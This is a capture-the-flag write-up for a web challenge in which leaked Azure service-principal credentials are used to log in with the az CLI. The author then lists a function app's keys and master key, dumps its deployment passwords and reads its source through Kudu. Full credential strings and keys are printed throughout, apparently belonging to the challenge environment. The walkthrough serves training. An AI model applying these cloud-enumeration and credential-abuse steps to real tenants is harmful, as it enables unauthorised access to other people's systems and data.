# The Obligatory Lambda 
**Web, 300**

### Prompt

Spoiler: It's not actually Lambda.

A colleague accidentally pasted some credentials to the wrong chat, but didn't change them after deleting the message. See if you can figure out what they go to.

username: 556973dd-ae65-499a-b19f-fafdc42d1884 tenant: 601fd801-c161-434e-add7-82dd3581b8cb password: qum8Q~P-nsLdUotALCCCYWM.5-~URbq3wW2-6aU9

### Solution 
The credentials are very Azure. 

```bash
> az login --service-principal -u 556973dd-ae65-499a-b19f-fafdc42d1884 -p qum8Q~P-nsLdUotALCCCYWM.5-~URbq3wW2-6aU9 --tenant 601fd801-c161-434e-add7-82dd3581b8cb
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "601fd801-c161-434e-add7-82dd3581b8cb",
    "id": "5114ad5f-eba0-48cb-ac20-70d475fff746",
    "isDefault": true,
    "managedByTenants": [],
    "name": "Azure subscription 1",
    "state": "Enabled",
    "tenantId": "601fd801-c161-434e-add7-82dd3581b8cb",
    "user": {
      "name": "556973dd-ae65-499a-b19f-fafdc42d1884",
      "type": "servicePrincipal"
    }
  }
]
```
Note that the `--service-principle` is necessary. You might also need port 80 and 443 exposed. 

Now we have (way too) many options. An interesting finding is that there's an Azure function app under this account. 
```bash
azure functionapp fetch-app-settings tenable-ctf
``` 

shows the url
```json
"defaultHostName": "tenable-ctf.azurewebsites.net",
```

We can also find all *functions* under this function app. 
```bash
> func azure functionapp list-functions tenable-ctf --show-keys
https://tenable-ctf.azurewebsites.net/api/getflag?code=eb9awF91rLqXFBaHQQDxxaJRfvbICt6LCYcqDrgZkIEu1aimjFAGKg==
```  
I don't have a screenshot, but the website asks for a *id* parameter. If the provided one isn't the same as the expected, the website returns *I happen to know xxx, but you look nothing like them.*

There are a couple ways to access the source code: 
- Use the [kudu service](https://github.com/projectkudu/kudu/wiki/Accessing-the-kudu-service), authenticate with deployment credentials. That means visiting https://tenable-ctf.scm.azurewebsites.net/basicauth with the credential below. 
```bash
> az functionapp deployment list-publishing-profiles -g ctf -n tenable-ctf
[
  {
    "SQLServerDBConnectionString": "",
    "controlPanelLink": "http://windows.azure.com",
    "databases": null,
    "destinationAppUrl": "http://tenable-ctf.azurewebsites.net",
    "hostingProviderForumLink": "",
    "msdeploySite": "tenable-ctf",
    "mySQLDBConnectionString": "",
    "profileName": "tenable-ctf - Web Deploy",
    "publishMethod": "MSDeploy",
    "publishUrl": "tenable-ctf.scm.azurewebsites.net:443",
    "userName": "$tenable-ctf",
    "userPWD": "jwZ37Afo2xnKimhqiExaeqCGba5oPqSmKmCsgx2zyDXFGrdsfs5bQH60oxj1",
    "webSystem": "WebSites"
  },
  {
    "SQLServerDBConnectionString": "",
    "controlPanelLink": "http://windows.azure.com",
    "databases": null,
    "destinationAppUrl": "http://tenable-ctf.azurewebsites.net",
    "ftpPassiveMode": "True",
    "hostingProviderForumLink": "",
    "mySQLDBConnectionString": "",
    "profileName": "tenable-ctf - FTP",
    "publishMethod": "FTP",
    "publishUrl": "ftp://waws-prod-dm1-157.ftp.azurewebsites.windows.net/site/wwwroot",
    "userName": "tenable-ctf\\$tenable-ctf",
    "userPWD": "jwZ37Afo2xnKimhqiExaeqCGba5oPqSmKmCsgx2zyDXFGrdsfs5bQH60oxj1",
    "webSystem": "WebSites"
  },
  {
    "SQLServerDBConnectionString": "",
    "controlPanelLink": "http://windows.azure.com",
    "databases": null,
    "destinationAppUrl": "http://tenable-ctf.azurewebsites.net",
    "hostingProviderForumLink": "",
    "mySQLDBConnectionString": "",
    "profileName": "tenable-ctf - Zip Deploy",
    "publishMethod": "ZipDeploy",
    "publishUrl": "tenable-ctf.scm.azurewebsites.net:443",
    "userName": "$tenable-ctf",
    "userPWD": "jwZ37Afo2xnKimhqiExaeqCGba5oPqSmKmCsgx2zyDXFGrdsfs5bQH60oxj1",
    "webSystem": "WebSites"
  },
  {
    "SQLServerDBConnectionString": "",
    "controlPanelLink": "http://windows.azure.com",
    "databases": null,
    "destinationAppUrl": "http://tenable-ctf.azurewebsites.net",
    "ftpPassiveMode": "True",
    "hostingProviderForumLink": "",
    "mySQLDBConnectionString": "",
    "profileName": "tenable-ctf - ReadOnly - FTP",
    "publishMethod": "FTP",
    "publishUrl": "ftp://waws-prod-dm1-157dr.ftp.azurewebsites.windows.net/site/wwwroot",
    "userName": "tenable-ctf\\$tenable-ctf",
    "userPWD": "jwZ37Afo2xnKimhqiExaeqCGba5oPqSmKmCsgx2zyDXFGrdsfs5bQH60oxj1",
    "webSystem": "WebSites"
  }
]
```

- Use Azure Storage Explorer. [Here's a nice write-up with this approach by @langemyh](https://github.com/langemyh/writeups/blob/main/tenable-ctf/2022/web/The%20Obligatory%20Lambda%20Challenge.md)
- I am not sure how this is discovered, but you can send a request to https://tenable-ctf.azurewebsites.net/admin/vfs/home/site/wwwroot/getFlag/\_\_init\_\_.py. You need to provide the *masterKey* in the *x-functions-key* field in the request header. The *masterKey* can be retrieved by
```bash
az functionapp keys list -n tenable-ctf -g ctf
{
  "functionKeys": {
    "default": "SnYQlFoW9NK/l3s9Myv2/5FybfAlVx6jVgaY4Z/aAZEizoH2Fl0bOg=="
  },
  "masterKey": "ooc2eagHaw/1OEEkzwLtOdlF10l35D8ttobTlLMaMb6F9paF6Lvz9Q==",
  "systemKeys": {}
}
```
The response looks like 
<img width="971" alt="Capture" src="https://user-images.githubusercontent.com/21980161/173721044-51fa4e20-2ff6-4a2c-b22c-9a970209a1f9.PNG">

